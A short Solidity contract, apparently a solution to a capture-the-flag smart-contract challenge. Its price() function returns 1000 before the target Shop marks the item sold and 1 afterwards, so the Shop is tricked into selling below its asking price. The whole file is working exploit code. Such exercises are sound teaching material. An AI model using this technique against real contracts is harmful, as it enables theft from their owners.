// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Evil22 {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return 1000;
        } else {
            return 1;
        }
    }

    function buy() external {
        shop.buy();
    }
}
